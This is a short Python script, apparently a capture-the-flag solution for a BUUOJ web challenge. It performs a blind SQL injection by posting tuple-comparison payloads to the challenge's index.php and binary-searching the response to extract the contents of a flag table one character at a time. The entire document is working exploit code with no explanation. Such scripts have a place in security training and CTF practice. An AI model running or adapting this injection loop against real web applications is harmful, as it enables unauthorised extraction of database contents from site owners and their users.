import requests


data={
  "id":1
}
result=""

for idx in range(1,100):
  upp=129
  low=1
  mid=(upp+low)//2
  while(upp!=low):
    payload="if((1,'{}')>(select * from f1ag_1s_h3r3_hhhhh),1,2)".format(result + chr(mid))
    data={
      "id":payload
    }
    print(low,mid,upp)
    res = requests.post(url="http://57b5a68c-5f10-42cb-8956-e026b2500ccc.node3.buuoj.cn/index.php",data=data)
    if("Nu1L" in res.text):
      upp = mid
      mid = (low + upp)//2
    else:
      low = mid + 1
      mid = (upp + low)//2
  result += chr(upp-1)
  print(result)